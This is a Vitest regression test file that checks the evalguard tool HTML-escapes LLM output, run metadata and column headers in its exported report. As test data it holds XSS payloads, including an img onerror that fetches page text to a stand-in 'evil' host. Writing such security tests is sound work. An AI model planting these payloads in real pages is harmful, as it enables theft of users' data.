import { describe, expect, it } from "vitest";
import { toHTML } from "../export.js";
import type { StoredRun } from "../store.js";

/**
 * Regression: `evalguard export <runId> -f html` interpolated LLM output, run
 * name, model, provider and every result cell straight into the report markup.
 * A red-team eval whose case output is an XSS payload therefore executed the
 * moment an engineer opened report.html — and a file:// page can read and
 * exfiltrate the whole report.
 *
 * Removing any escapeHtml() call fails these.
 */
const PAYLOAD = `<img src=x onerror="fetch('https://evil/'+document.body.innerText)">`;

function run(overrides: Partial<StoredRun> = {}): StoredRun {
  return {
    id: "run-1",
    type: "eval",
    name: "nightly",
    model: "gpt-4o",
    provider: "openai",
    timestamp: "2026-07-26T00:00:00Z",
    passRate: 0.9,
    score: 9,
    maxScore: 10,
    passed: 9,
    failed: 1,
    total: 10,
    latencyMs: 1234,
    ...overrides,
  };
}

describe("evalguard export --format html — XSS", () => {
  it("escapes an adversarial case output", () => {
    const html = toHTML(run({ results: [{ case: "c1", output: PAYLOAD, passed: false }] }));
    // No live tag/attribute survives — the payload is inert text.
    expect(html).not.toContain("<img src=x");
    expect(html).not.toContain(`onerror="fetch(`);
    expect(html).toContain("&lt;img src=x");
    expect(html).toContain("onerror=&quot;fetch(");
  });

  it("escapes the run name, id, model, provider and timestamp", () => {
    const html = toHTML(
      run({
        name: "<script>alert(1)</script>",
        id: "<b>id</b>",
        model: "<i>m</i>",
        provider: "<u>p</u>",
        timestamp: "<em>t</em>",
      }),
    );
    expect(html).not.toContain("<script>alert(1)</script>");
    expect(html).not.toContain("<b>id</b>");
    expect(html).not.toContain("<i>m</i>");
    expect(html).not.toContain("<u>p</u>");
    expect(html).not.toContain("<em>t</em>");
  });

  it("escapes result column headers", () => {
    const html = toHTML(run({ results: [{ "<svg onload=alert(1)>": "v" }] }));
    expect(html).not.toContain("<svg onload=alert(1)>");
    expect(html).toContain("&lt;svg onload=alert(1)&gt;");
  });

  it("still renders the ordinary report content", () => {
    const html = toHTML(run({ results: [{ case: "c1", output: "all good", passed: true }] }));
    expect(html).toContain("EvalGuard Report");
    expect(html).toContain("nightly");
    expect(html).toContain("all good");
    expect(html).toContain("90.0%");
  });
});
